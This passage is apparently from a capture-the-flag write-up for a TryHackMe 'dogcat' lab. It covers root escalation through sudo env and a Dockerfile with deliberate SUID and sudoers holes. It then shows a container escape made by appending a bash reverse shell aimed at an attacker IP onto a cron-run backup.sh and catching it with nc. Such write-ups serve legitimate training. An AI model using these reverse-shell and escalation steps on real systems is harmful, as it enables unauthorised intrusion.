$ sudo /usr/bin/env /bin/bash




id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
flag3.txt
cat flag3.txt
THM{D1ff3r3nt_xxxxxx}
```

## flag 4

Through `LinPeas` we found another interesting file

```bash
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2949120 Aug 10 09:30 /opt/backups/backup.tar
-rwxr--r-- 1 root root 69 Mar 10  2020 /opt/backups/backup.sh
```

We extract tar file and we inspect content:

```bash
cp backup.tar /tmp/
cd /tmp
tar xvf backup.tar
root/container/
root/container/Dockerfile
root/container/backup/
root/container/backup/backup.sh
..
..
```

Dockerfile

```bash
cat Dockerfile
FROM php:apache-buster

# Setup document root
RUN mkdir -p /var/www/html

# Make the document root a volume
VOLUME /var/www/html

# Add application
WORKDIR /var/www/html
COPY --chown=www-data src/ /var/www/html/

RUN rm /var/log/apache2/*.log

# Set up escalation
RUN chmod +s `which env`
RUN apt-get update && apt-get install sudo -y
RUN echo "www-data ALL = NOPASSWD: `which env`" >> /etc/sudoers

# Write flag
RUN echo "THM{D1ff3r3nt_mxxxxxxxxx}" > /root/flag3.txt
RUN chmod 400 /root/flag3.txt

RUN echo "THM{LF1_t0_RC3_axxxxxxxx}" > /var/www/flag2_QMW7JvaY2LvK.txt

EXPOSE 80

# Configure a healthcheck to validate that everything is up&running
HEALTHCHECK --timeout=10s CMD curl --silent --fail http://127.0.0.1:80/
```

Our guess is that we actually are in a Docker container.

So we must find a way to "excape" the container.

We hope that there is some cronjobs that runs `backup.sh`

So we add our reverse shell to that file:

```bash
echo "bash -i >& /dev/tcp/10.8.100.14/5555 0>&1" >> backup.sh

cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
bash -i >& /dev/tcp/10.8.100.14/5555 0>&1
```

We spawn a listener:

```bash
joshua@kaligra:~/Documents/thm/dogcat/root/container$ nc -nvlp 5555
listening on [any] 5555 ...
```

and we receive shell!!

```bash
connect to [10.8.100.14] from (UNKNOWN) [10.10.189.56] 59144
bash: cannot set terminal process group (14705): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~#
root@dogcat:~#
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{esc4l4tions_on_esXXXXXXXXXXXXXXXXXXXXXXXXXX}
root@dogcat:~#
```





